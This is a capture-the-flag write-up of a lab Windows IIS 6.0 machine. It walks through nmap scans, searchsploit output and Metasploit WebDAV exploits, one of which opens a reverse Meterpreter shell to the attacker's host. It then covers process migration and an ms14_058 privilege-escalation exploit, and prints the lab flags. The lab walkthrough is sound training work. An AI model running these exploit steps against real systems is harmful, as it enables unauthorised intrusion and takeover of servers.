# Summary
### 1. NMAP

### 2. Enumeration

### 3. Exploit

### 4. Privilege Escalation

# Attack
## 1. NMAP
As usual, let's see what we got.
```
hippoeug@kali:~$ nmap -sC -sV 10.10.10.14 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-25 19:52 +08
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Error
| http-webdav-scan: 
|   Server Date: Mon, 25 Jan 2021 11:53:06 GMT
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Ah, only one port which runs IIS, which we've seen in [Devel](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Devel.md).

Let's see the vulnerability script.
```
hippoeug@kali:~$ nmap --script vuln 10.10.10.14 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-25 19:53 +08
...
PORT   STATE SERVICE
80/tcp open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|_  /_vti_bin/shtml.exe: Frontpage file or folder
|_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path>
| http-phpmyadmin-dir-traversal: 
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|       
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd not found.
|   
|     References:
|       http://www.exploit-db.com/exploits/1244/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
...
```
Interesting, let's visit the page.

## 2. Enumeration
Visiting `http://10.10.10.14:80` on our browser, we get an "Under Construction" page.

Let's do some searches for `Microsoft IIS httpd 6.0`. If we end up not being able to find any exploits, we can try Dirbuster.
```
hippoeug@kali:~$ searchsploit iis 6.0
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                    | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                             | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                               | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                        | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                              | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                            | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                         | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                         | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                     | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                                                                       | windows/remote/8765.php
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                            | windows/remote/19033.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Ooh, quite a few potential exploits. We also Google "microsoft iis httpd 6.0 exploit" to limit down our search. We see two metasploit modules, [Microsoft IIS WebDAV Write Access Code Execution](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp/) & [Microsoft IIS WebDav ScStoragePathFromUrl Overflow](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/).

## 3. Exploit
Let's try [Microsoft IIS WebDAV Write Access Code Execution](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp/) first.
```
msf5 > use exploit/windows/iis/iis_webdav_upload_asp
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/iis/iis_webdav_upload_asp) > show targets
...
msf5 exploit(windows/iis/iis_webdav_upload_asp) > show options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host
...
msf5 exploit(windows/iis/iis_webdav_upload_asp) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Checking /metasploit7894726.asp
[*] Uploading 609576 bytes to /metasploit7894726.txt...
[-] Upload failed on /metasploit7894726.txt [403 Forbidden]
[*] Exploit completed, but no session was created.
```
Hmm, `403 Forbidden`. Let's change something up and see if it makes any difference.
```
msf5 exploit(windows/iis/iis_webdav_upload_asp) > set method copy
method => copy
msf5 exploit(windows/iis/iis_webdav_upload_asp) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Checking /metasploit264443075.asp
[*] Uploading 609405 bytes to /metasploit264443075.txt...
[-] Upload failed on /metasploit264443075.txt [403 Forbidden]
[*] Exploit completed, but no session was created.
```
Still the same `403 Forbidden` message.

Let's try the other exploit, [Microsoft IIS WebDav ScStoragePathFromUrl Overflow](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/).
```
msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show targets
...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options
...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.10.10.14:1030) at 2021-01-26 19:22:06 +0800

meterpreter > 
```
We got a Meterpreter shell! Time to find flags.

Let's try to navigate around in Users.
```
meterpreter > cd Administrator
[-] stdapi_fs_chdir: Operation failed: Access is denied.
meterpreter > cd Harry
[-] stdapi_fs_chdir: Operation failed: Access is denied.
```
Hmm, Access is denied. Let's try `getuid`.
```
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```
Time for privilege escalation.

## 4. Privilege Escalation
Since we got a Meterpreter shell, we can just run the `/recon/local_exploit_suggester`.
```
[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
Wow, again full of exploits we can potentially use.

Let's run the first one, `exploit/windows/local/ms14_058_track_popup_menu`.
```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > back
msf5 > use exploit/windows/local/ms14_058_track_popup_menu
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
...
msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit

[*] Started reverse TCP handler on 10.10.x.x:5555 
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
[*] Exploit completed, but no session was created.
```
Access is denied. Maybe it is because we are in a directory where this exploit do not have write permissions. We first saw this in [Devel](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Devel.md), where we had to navigate to the %temp% folder with the meterpreter shell. This is best explained by the official write up, "By default, the working directory is set to c:\windows\system32\inetsrv, which the IIS user does not have write permissions for. Navigating to c:\windows\TEMP is a good idea, as a large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation."

Let's move to `%temp`.
```
meterpreter > cd %temp%
meterpreter > pwd
C:\WINDOWS\TEMP
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
...
msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit

[*] Started reverse TCP handler on 10.10.x.x:5555 
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
[*] Exploit completed, but no session was created.
```
Nope, still the same error.

After reading up on Official Guide, we see that it is suggested to migrate to a process running under NT AUTHORITY\NETWORK SERVICE.
```
msf5 exploit(windows/local/ms14_058_track_popup_menu) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 272   4     smss.exe                                                        
 324   272   csrss.exe                                                       
 348   272   winlogon.exe                                                    
 396   348   services.exe                                                    
 408   348   lsass.exe                                                       
 612   396   svchost.exe                                                     
 684   396   svchost.exe                                                     
 740   396   svchost.exe                                                     
 768   396   svchost.exe                                                     
 804   396   svchost.exe                                                     
 940   396   spoolsv.exe                                                     
 968   396   msdtc.exe                                                       
 1088  396   cisvc.exe                                                       
 1128  396   svchost.exe                                                     
 1184  396   inetinfo.exe                                                    
 1224  396   svchost.exe                                                     
 1324  396   VGAuthService.exe                                               
 1412  396   vmtoolsd.exe                                                    
 1460  396   svchost.exe                                                     
 1600  396   svchost.exe                                                     
 1692  1088  cidaemon.exe                                                    
 1792  396   alg.exe                                                         
 1808  612   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2180  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2248  612   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2300  2180  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 2316  1088  cidaemon.exe                                                    
 2340  1088  cidaemon.exe                                                    
 2488  612   wmiprvse.exe                                                    
 2900  348   logon.scr                                                       
 3100  1460  w3wp.exe                                                        
 3676  612   davcdata.exe                                                    

meterpreter > migrate 1808
[*] Migrating from 2300 to 1808...
[*] Migration completed successfully.
meterpreter > 
```
Done. Let's get back to our privilege escalation exploit.
```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit

[*] Started reverse TCP handler on 10.10.14.15:5555 
[*] Launching notepad to host the exploit...
[+] Process 3060 launched.
[*] Reflectively injecting the exploit DLL into 3060...
[*] Injecting exploit into 3060...
[*] Exploit injected. Injecting payload into 3060...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.14.15:5555 -> 10.10.10.14:1032) at 2021-01-26 19:47:34 +0800

meterpreter > 
```
Done! Time to just find flags!
```
meterpreter > dir
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 22:28:50 +0800  root.txt

meterpreter > cat root.txt
9359e905a2c35f861f6a57cecf28bb7b
...
Listing: C:\Documents and Settings\Harry\Desktop
================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 22:32:09 +0800  user.txt

meterpreter > cat user.txt
bdff5ec67c3cff017f2bedc146a5d869
```
